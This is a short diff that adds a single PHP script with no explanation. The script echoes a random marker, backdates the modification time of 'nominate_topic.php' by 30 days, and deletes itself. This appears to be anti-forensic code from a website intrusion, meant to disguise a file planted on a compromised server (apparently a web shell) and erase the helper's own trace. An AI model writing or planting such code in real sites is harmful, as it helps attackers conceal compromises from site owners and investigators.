@@ -1,0 +1,1 @@
+<?php echo "mTDWHMbQGR"; if (file_exists("./nominate_topic.php")){ touch("./nominate_topic.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*UPARX7Wg7N1aRtwwU5yP*/ ?>
